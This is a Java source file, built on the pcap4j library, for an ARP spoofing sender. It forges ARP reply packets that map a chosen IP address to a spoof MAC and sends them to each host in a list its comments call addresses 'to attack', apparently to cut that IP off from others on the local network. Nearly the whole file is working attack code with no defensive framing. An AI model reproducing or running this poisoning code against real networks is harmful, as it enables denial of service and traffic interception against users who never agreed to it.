package proto.sender;


import org.pcap4j.core.PcapHandle;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.ByteArrays;
import org.pcap4j.util.MacAddress;

import java.net.InetAddress;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.stream.Collectors;

public class ArpSpoofSender implements Runnable {

    private Map<InetAddress, MacAddress> ipMap; // list of ips and macAddress to block
    private InetAddress IpAddress; // ip address to block for others
    private MacAddress spoofMacAddress; // mac address to use as a spoof
    private PcapHandle sendHandle;

    /**
     *
     * @param ipMap - Map to ips and macs to attack
     * @param IpAddress - Ip addres to block for others
     * @param spoofMacAddress - mac used to send fake arp reply packers
     * @param sendHandle - pcap handle used to send packets
     */
    public ArpSpoofSender(Map<InetAddress, MacAddress> ipMap, InetAddress IpAddress, MacAddress spoofMacAddress, PcapHandle sendHandle) {
        this.ipMap = ipMap;
        this.IpAddress = IpAddress;
        this.spoofMacAddress = spoofMacAddress;
        this.sendHandle = sendHandle;
    }

    @Override
    public void run() {
        try {
            Set<Map.Entry<InetAddress, MacAddress>> entries = ipMap.entrySet();

            for (Map.Entry<InetAddress, MacAddress> entry : entries) {
                sendArpSppofPacket(entry.getKey(), entry.getValue());
            }
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }
    }


    /**
     * @param ip  destination ip address
     * @param mac destination mac address
     * @throws Exception - any error
     */

    private void sendArpSppofPacket(InetAddress ip, MacAddress mac) throws Exception {
       // System.out.println( "attacking ip "+ ip+ "   "+ mac);
        //MacAddress randomMac = getRandomMac(mac);

        ArpPacket.Builder arpBuilder = new ArpPacket.Builder();
        arpBuilder
                .hardwareType(ArpHardwareType.ETHERNET)
                .protocolType(EtherType.IPV4)
                .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                .protocolAddrLength((byte) ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES)
                .operation(ArpOperation.REPLY)
                .srcHardwareAddr(spoofMacAddress)
                .srcProtocolAddr(IpAddress)
                .dstHardwareAddr(mac)
                .dstProtocolAddr(ip);

        EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
        etherBuilder.dstAddr(mac)
                .srcAddr(spoofMacAddress)
                .type(EtherType.ARP)
                .payloadBuilder(arpBuilder)
                .paddingAtBuild(true);

        Packet packet = etherBuilder.build();
        sendHandle.sendPacket(packet);
    }



    /**
     * todo: have to test this
     * if the size of the network is greater then 3 then gives a random mac
     * @param destinationMacAddress help full so that same mac is not used in random mac
     * @return random mac to be used as spoof src
     */

    private MacAddress getRandomMac(MacAddress destinationMacAddress) {
        if (ipMap.size() > 3) {
            List<MacAddress> macs = ipMap.entrySet()
                    .stream()
                    .map((entry) -> entry.getValue())
                    .collect(Collectors.toList());

            while (true) {
                int number = (int) ((Math.random() * 10) % macs.size());
                if (!macs.get(number).equals(destinationMacAddress)) {
                    return macs.get(number);
                }
            }


        } else {
            return spoofMacAddress;
        }
    }
}

